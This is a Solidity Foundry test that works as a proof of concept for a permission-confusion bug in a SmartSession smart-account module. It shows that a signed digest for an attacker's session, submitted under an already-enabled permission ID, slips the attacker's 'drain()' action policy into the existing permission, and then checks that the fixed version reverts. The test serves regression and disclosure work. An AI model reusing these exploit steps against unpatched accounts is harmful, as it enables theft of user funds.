// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import { SmartSession } from "contracts/SmartSession.sol";
import { SmartSessionFixed } from "contracts/SmartSessionFixed.sol";
import { EncodeLib } from "contracts/lib/EncodeLib.sol";
import {
    ActionData,
    ChainDigest,
    EnableSession,
    ISessionValidator,
    IRegistry,
    ModuleType,
    PermissionId,
    PolicyData,
    Session,
    SmartSessionMode
} from "contracts/DataTypes.sol";

/// @dev The historical fix only moved this check outside the existing-session branch.
/// This harness exposes the production internal function without changing its body.
contract SmartSessionHarness is SmartSession {
    function enableFor(
        PermissionId permissionId,
        bytes calldata packedSig,
        address account
    ) external returns (bytes memory) {
        (, , bytes calldata enableData) = EncodeLib.unpackMode(packedSig);
        return _enablePolicies(permissionId, enableData, account, SmartSessionMode.UNSAFE_ENABLE);
    }

    function encodeEnable(PermissionId permissionId, EnableSession memory enableData)
        external
        pure
        returns (bytes memory)
    {
        return EncodeLib.encodeEnable(permissionId, bytes(""), enableData);
    }
}

contract SmartSessionFixedHarness is SmartSessionFixed {
    function enableFor(
        PermissionId permissionId,
        bytes calldata packedSig,
        address account
    ) external returns (bytes memory) {
        (, , bytes calldata enableData) = EncodeLib.unpackMode(packedSig);
        return _enablePolicies(permissionId, enableData, account, SmartSessionMode.UNSAFE_ENABLE);
    }
}

contract MockAccount42062 {
    bytes4 internal constant MAGIC = 0x1626ba7e;

    function install(SmartSession module, bytes calldata data) external {
        module.onInstall(data);
    }

    function enable(
        SmartSessionHarness module,
        PermissionId permissionId,
        bytes calldata packedSig
    ) external {
        module.enableFor(permissionId, packedSig, address(this));
    }

    function installFixed(SmartSessionFixed module, bytes calldata data) external {
        module.onInstall(data);
    }

    function enableFixed(
        SmartSessionFixedHarness module,
        PermissionId permissionId,
        bytes calldata packedSig
    ) external {
        module.enableFor(permissionId, packedSig, address(this));
    }

    function isValidSignature(bytes32, bytes calldata) external pure returns (bytes4) {
        return MAGIC;
    }
}

contract MockValidator42062 is ISessionValidator {
    function supportsInterface(bytes4) external pure returns (bool) {
        return true;
    }

    function validateSignatureWithData(bytes32, bytes calldata, bytes calldata)
        external
        pure
        returns (bool)
    {
        return true;
    }
}

contract MockActionPolicy42062 {
    function supportsInterface(bytes4) external pure returns (bool) {
        return true;
    }

    function onInstall(bytes calldata) external { }
    function onUninstall(bytes calldata) external { }
    function isModuleType(uint256) external pure returns (bool) { return true; }
    function isInitialized(address, address, bytes32) external pure returns (bool) { return true; }
    function isInitialized(address, bytes32) external pure returns (bool) { return true; }
    function initializeWithMultiplexer(address, bytes32, bytes calldata) external { }

    function checkAction(bytes32, address, address, uint256, bytes calldata)
        external
        pure
        returns (uint256)
    {
        return 0;
    }
}

/// @dev The production source hard-codes the Rhinestone registry address.
/// A no-op registry is installed at that boundary for the exact onInstall path.
contract MockRegistry42062 is IRegistry {
    function check(address) external pure { }
    function checkForAccount(address, address) external pure { }
    function check(address, ModuleType) external pure { }
    function checkForAccount(address, address, ModuleType) external pure { }
    function trustAttesters(uint8, address[] calldata) external { }
    function check(address, address[] calldata, uint256) external pure { }
    function check(address, ModuleType, address[] calldata, uint256) external pure { }
}

contract SmartSessions42062Test is Test {
    address internal constant REGISTRY = 0x000000000069E2a187AEFFb852bF3cCdC95151B2;

    function test_existingPermissionCanReceiveDifferentSessionPolicies() external {
        MockRegistry42062 registry = new MockRegistry42062();
        vm.etch(REGISTRY, address(registry).code);

        SmartSessionHarness smartSession = new SmartSessionHarness();
        MockAccount42062 account = new MockAccount42062();
        MockValidator42062 validatorA = new MockValidator42062();
        MockValidator42062 validatorB = new MockValidator42062();
        MockActionPolicy42062 actionPolicy = new MockActionPolicy42062();

        Session memory existing;
        existing.sessionValidator = ISessionValidator(address(validatorA));
        existing.salt = bytes32("existing-session");
        PermissionId existingPermission = smartSession.getPermissionId(existing);

        Session[] memory initialSessions = new Session[](1);
        initialSessions[0] = existing;
        account.install(smartSession, abi.encode(initialSessions));
        assertTrue(smartSession.isSessionEnabled(existingPermission, address(account)));
        assertEq(smartSession.getNonce(existingPermission, address(account)), 0);

        PolicyData[] memory policies = new PolicyData[](1);
        policies[0] = PolicyData({ policy: address(actionPolicy), initData: bytes("") });
        ActionData[] memory actions = new ActionData[](1);
        actions[0] = ActionData({
            actionTargetSelector: bytes4(keccak256("drain()")),
            actionTarget: address(0xBEEF),
            actionPolicies: policies
        });

        Session memory attackerSession;
        attackerSession.sessionValidator = ISessionValidator(address(validatorB));
        attackerSession.salt = bytes32("attacker-session");
        attackerSession.actions = actions;
        PermissionId attackerPermission = smartSession.getPermissionId(attackerSession);
        assertTrue(attackerPermission != existingPermission);

        // The signed digest is for attackerSession, but it is submitted under the already enabled permission.
        bytes32 digest = smartSession.getSessionDigest(
            existingPermission,
            address(account),
            attackerSession,
            SmartSessionMode.UNSAFE_ENABLE
        );
        EnableSession memory enableData;
        enableData.chainDigestIndex = 0;
        enableData.hashesAndChainIds = new ChainDigest[](1);
        enableData.hashesAndChainIds[0] = ChainDigest({ chainId: uint64(block.chainid), sessionDigest: digest });
        enableData.sessionToEnable = attackerSession;
        bytes memory packed = smartSession.encodeEnable(existingPermission, enableData);

        // Historical vulnerable SmartSession sees an existing validator and skips the permissionId check.
        account.enable(smartSession, existingPermission, packed);

        assertEq(smartSession.getNonce(existingPermission, address(account)), 1);
        // The action policy from attackerSession is now stored under existingPermission.
        assertTrue(
            smartSession.isPermissionEnabled(
                existingPermission,
                address(account),
                new PolicyData[](0),
                new PolicyData[](0),
                actions
            )
        );

        // The production fix from 21af6ae rejects the same mismatched signed intent.
        SmartSessionFixedHarness fixedModule = new SmartSessionFixedHarness();
        MockAccount42062 fixedAccount = new MockAccount42062();
        fixedAccount.installFixed(fixedModule, abi.encode(initialSessions));
        bytes32 fixedDigest = fixedModule.getSessionDigest(
            existingPermission,
            address(fixedAccount),
            attackerSession,
            SmartSessionMode.UNSAFE_ENABLE
        );
        enableData.hashesAndChainIds[0].sessionDigest = fixedDigest;
        bytes memory fixedPacked = smartSession.encodeEnable(existingPermission, enableData);
        vm.expectRevert(
            abi.encodeWithSignature("InvalidPermissionId(bytes32)", PermissionId.unwrap(existingPermission))
        );
        fixedAccount.enableFixed(fixedModule, existingPermission, fixedPacked);
    }
}
